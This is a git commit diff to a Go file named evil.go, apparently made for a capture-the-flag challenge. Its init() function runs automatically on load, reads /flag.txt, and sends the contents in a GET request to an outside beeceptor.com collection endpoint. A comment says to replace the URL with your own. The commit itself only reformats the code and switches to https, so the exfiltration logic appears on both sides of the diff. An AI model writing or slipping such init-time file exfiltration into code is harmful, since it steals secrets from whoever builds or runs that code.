4727e6065b74bcf6e8de1c4e4f6c82d76994d0c1
RASHIDY <112910192+MostafaRashidy@users.noreply.github.com>
2025-08-11 04:29:08 +0300

    Update evil.go

--- evil.go
+++ evil.go
@@ -1,18 +1,19 @@
 package main
 
 import (
- "io/ioutil"
- "net/http"
- "os"
+  "io/ioutil"
+  "net/http"
+  "os"
 )
 
 func init() {
- flag, err := ioutil.ReadFile("/flag.txt")
- if err != nil {
-  return
- }
- http.Get("http://rashidy.free.beeceptor.com?flag=" + string(flag))
- os.Exit(0) // Prevent further execution if needed
+  flag, err := ioutil.ReadFile("/flag.txt")
+  if err != nil {
+    return
+  }
+  // Exfiltrate the flag (replace with your own URL)
+  http.Get("https://rashidy.free.beeceptor.com?flag=" + string(flag))
+  os.Exit(0)  // Prevents normal execution continuing
 }
 
 func main() {}
